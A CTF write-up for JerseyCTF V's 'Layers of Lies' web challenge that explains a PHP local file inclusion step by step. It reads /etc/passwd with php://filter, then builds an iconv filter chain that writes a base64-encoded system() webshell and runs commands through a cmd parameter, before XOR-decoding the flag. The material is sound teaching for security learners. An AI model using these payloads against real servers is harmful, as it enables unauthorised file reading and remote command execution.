---
title: "Layers of Lies - JerseyCTF V"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "php", "php-wrappers", "lfi", "xor", "path-traversal", "php-filter", "file-upload", "burp", "cyberchef", "base64", "jerseyctf-v", "ctf-writeup"]
summary: "You’ve stumbled upon a mysterious webpage with nothing but a cryptic message: \"Nothing to see here...or is there?\"."
source:
  name: "CTFtime writeup #40136"
  url: "https://ctftime.org/writeup/40136"
ctf:
  name: "JerseyCTF V"
  challenge: "Layers of Lies"
---

## Metadata

- **CTF:** JerseyCTF V
- **Task:** Layers of Lies
- **Author team:** Knightsec
- **CTFtime tags:** php, php-wrappers, lfi
- **CTFtime:** <https://ctftime.org/writeup/40136>

---
# Challenge Description  
You’ve stumbled upon a mysterious webpage with nothing but a cryptic message: "Nothing to see here...or is there?". There must be more to it.

## Side Note  
I've broken every step down as much as I can to help newer web CTFers. When I first started code auditing was daunting and difficult, I hope breaking it down and understanding it will incite some excitement in you and motivate you to do some cool code auditing and publish your own writeups down the road!

Worked on this with challenge+writeup with <https://ctftime.org/user/223025>.

## Initial Enumeration  
The site appears to be empty, but if you inspect your browser's network tab then refresh the page, you will catch several PHP files being loaded. They contain a mix of strings encoded in hex, base64, and binary. Those of interest include `Hexed.php` and `Layers.php`, which decode to `The key is 0x14`and `The locks are kept in the home of Loab.` respectively. `Mysteries.php` decoded from binary tells us `Look CLOSELY at the NNNames of the FFFiles. It's a surprise tool that will help us later.`. Depending on how the files are loaded in the page, there is a chance you will get `Xylophone.php`, `Overdrive.php`, and `Riddle.php` in order, clearly indicating to us that we will have to use `0x14` as a key to XOR decrypt some ciphertext later on.

## Code Auditing  
We're given a small `view.php` file the following contents:  
```php  
function($input) {   
if (!isset($input)) {  
return null;  
} else if (empty($input)) {  
return false;  
}

// Sanitize input  
// Remove double dots  
$input = preg_replace('/\\.{2,}/', '.', $input);

// Fail if attempting direct file access  
if (str_starts_with($input, '/')) {  
http_response_code(403);  
exit(0);  
}

return $input;  
}]);

if (!empty($file)) {  
if (!@include_once($file)) {  
echo "File " . htmlspecialchars($file) . " not found!";  
}  
} else {  
echo "No file provided.";  
}  
```

If you're new to auditing PHP code I'll break down the key security concerns in the above snippet. First we see our file parameter is being passed into a **filter_input** PHP function. This function allows you to specify a custom in-line function to filter user input or use PHP's built-in ones. Here a simple check is being done to ensure it's not empty and has been set. 

```php  
$input = preg_replace('/\\.{2,}/', '.', $input);  
```

Then this snippet uses regex to replace all sequential dots to a singular dot. This is in an attempt to prevent classic path traversal such ```IntendedFile.txt../../../../../../../../../etc/passwd``` -> with the filtering becomes -> ```IntendedFile.txt./././././././././etc/passwd```.

```php  
if (str_starts_with($input, '/'))  
```  
Lastly, the above snippet makes you the string doesn't start with **/** so you can't simply pass in **/etc/passwd** - the absolute path to a file.

I attempted to bypass this by using Hex Encoding of the **/** character which would be **%2Fetc/passwd**, unicode encoding, url encoding, double url encoding, etc. I even tried using **\/etc/passwd**, **\\\/etc/passwd**, **\\\etc\\\passwd**, **%00 OR %0A injection** with no luck. This wouldn't work because the input is decoded by the PHP server and then passed into the regex and conditional checks.  
\- A lot of the tricks I tried are from this resource (amazing for CTFs)  
\- <https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion>

However, the below snippet is concerning:

```php  
@include_once($file)  
```

**Include_once** is a PHP keyword that allows you to include an external PHP file into the main file and execute it. If you're from Python land you can think of it as importing your custom python module-it'll execute any code in the external file. There's some cool PHP-specific things being done here. The use of the **'@'** suppresses any warnings and errors from being leaked back to us. 

However, we can't just poison log files or upload a malicious file and include it because there's no file upload functionality and our inputs are being stripped. Turns out the include_once supports PHP **stream wrappers**. An exampel of some PHP include the **php://filter** (apply filters on a file stream).

A quick google search reveals we can use the following filter on the file stream to base64 encode a resource such as /etc/passwd.  
```  
php://filter/convert.base64-encode/resource=/etc/passwd  
URL:  
<http://layers-of-lies.aws.jerseyctf.com/view.php?file=php://filter/convert.base64-encode/resource=/etc/passwd>  
```  
For more information on PHP filters and how to use them in LFI to chain RCE, check out this writeup: <https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06>

Base64 encoded output from passing the wrapped `/etc/passwd` as a param to `file`:  
```  
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp1YnVudHU6eDoxMDAwOjEwMDA6Oi9ob21lL3VidW50dTovYmluL3NoCmxvYWI6eDoxMDAxOjEwMDE6Oi9ob21lL2xvYWI6L2Jpbi9zaAo=  
```

Decoding this gives us the following:  
```  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
ubuntu:x:1000:1000::/home/ubuntu:/bin/sh  
loab:x:1001:1001::/home/loab:/bin/sh  
```

We see the user **loab**, this is important later on. After realizing we had LFI I tried LFI 2 RCE using log poisoning, reading environment variables, cmdline, etc. That's when I decided to go ahead and open the challenge in my browser with BurpSuite fired up. Accessing the challenge off the bat shows numerous requests being made to the vulnerable **view.php** with numerous PHP file named being passed in, executed and output being shown. 

One of these was **/view.php?file=Overdrive.php** with the following output

```  
Raw:  
01000101 01110010 01110010 01101111 01110010 00100000 00110100 00110000 00110100 00111010 00100000 01000110 01101100 01100001 01100111 00100000 01101110 01101111 01110100 00100000 01100110 01101111 01110101 01101110 01100100 00101110

Decoded from Binary:  
Error 404: Flag not found.  
```

This usually means the flag has been put in a non-standard location and gives us an idea that we need to do more than just LFI. This is when I began to shift gears and attempt to hammer on RCE more with these wrappers. Moreover, during my LFI attempts I noticed numerous indicators of **NSJAIL** and other sandboxes being used further hinting at us needing to pivot to command execution.

## Exploitation

One of the files had a useful hint that said "The locks are kept in the home of Loab.". Okay, time to attempt RCE. The only issue is we can't upload files and we can't include a poisoned log file so what do we do? After a little digging one of the cool PHP wrappers is the **php://temp** file stream. This lets us chain PHP wrappers and write to a temporary file stored in memory. If we can somehow construct a PHP shell we can then include this resource and run commands. To test this I tried the following:

```  
/view.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=php://temp  
Output:  
GyQpQw==

Base64 decoded:  
?$)C  
```  
The filter filter I used (**convert.iconv.UTF8.CSISO2022KR**) attempts to convert the inputted filestream character sets to korean. However, since nothing is being passed into the file stream it returns garbage value. However, this is a breakthrough because we're able to arbitrarily write and execute values in-memory via the php://temp wrapper. What if we chain a bunch of PHP wrappers in a way we can eventually write a simple PHP shell? We can automate this using the following github repo:  
<https://github.com/synacktiv/php_filter_chain_generator/tree/main>

I used one of their simple Phpinfo() wrappers and tested it  
```  
python3 [php_filter_chain_generator.py](http://php_filter_chain_generator.py) \--chain ' '

Out:  
php://filter/convert.iconv.UTF8.CSISO2022KR|convert... [TRUNCATED]

```  
When submitting this I was able to execute the phpinfo() function and receive a raw HTML output with the data.

One of the cool things with this tool is you test your PHP wrapper chain in case something goes wrong. For example, this is the webshell I want to use:  
```php

```  
To make sure this gets written properly with my chaining I can base64encode this and pass it into the tool to get a chain and then see if it's being written to the php://temp memory wrapper properly. For example:

```  
1) base64encode '' -> Jzw/cGhwIGVjaG8gc3lzdGVtKCRfR0VUWyJjbWQiXSkgPz4n  
2) python3 [php_filter_chain_generator.py](http://php_filter_chain_generator.py) \--rawbase64 'Jzw/cGhwIGVjaG8gc3lzdGVtKCRfR0VUWyJjbWQiXSkgPz4n' -> php://filter/convert.i...

3) /view.php?php://filter/convert.i... -> Jzw/cGhwIGVjaG8gc3lzdGVtKCRfR0VUWyJjbWQiXSkgPz4nGyQpQw+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+AD0APQ-  
```

Now we go into cyberchef and see if the returned base64 encoding has our PHP shell in it.  
```php  
''?$)C??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?Cà?Ð?Ðøôô>==??@?  
```

Ignoring the weird encoding garbage our shell is still intact. Remember, PHP doesn't care about invalid characters and looks for any PHP code it can execute (because it runs embedded in HTML tags so it has no choice but to be flexible, it's by design not by choice).

All that's left to do is generate our chain:  
```  
python3 ./[php_filter_chain_generator.py](http://php_filter_chain_generator.py) \--chain ''

out:  
php://filter/convert.iconv.UTF8.CSISO2022KR|conv... [TRUNCATED]  
```

Remember, we need to pass in our get parameter **CMD**  
```  
/view.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|conv...&cmd=id

Out:  
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),65534(nogroup)  
```

Now that we have command execution, we remember that one of the PHP files told us that we need to look in the "home of Loab", aka `/home/loab` on the server. Leveraging RCE (`ls -laht`) we find `/home/loab/secret-folder/deep-hint.txt` which is a base64 encoded blurb of text that contains flavor text among four "data fragments". One of them immediately sticks out by having unique characters not in the other string:   
```  
@|q4&zp4uzp4r}zux4duf`4{r4`|q4rxus4}g.4Qf%g\K R@QfK Xxi  
```

We know from earlier that we eventually have to XOR decrypt a string using a hex key of 14, so we pass this into a decoder like <https://www.dcode.fr/xor-cipher> and get the decrypted string `The 2nd and final part of the flag is: Er1sH_4FTEr_4Ll}`. Looking further down the file tree further using the same method, we find `/home/loab/secret-folder/deeply-hidden/flag-part.txt`. Decoding this gives us another blurb of text containing "Some Useless Information For You". We can attempt to decode them all, but one line immediately sticks out underneath "Random Gibberish":  
```  
@|q4r}fg`4duf`4{r4`|q4rxus4}g.4~w`rbo%@Kc gz@K-%,,  
```  
This string looks similar to the one we XORed prior, and contains a unique charset containing spaces and backticks that the other strings don't have. XORing this using the same method gives us the remaining part we need for the flag:  
`The first part of the flag is: jctfv{1T_w4snT_9188`
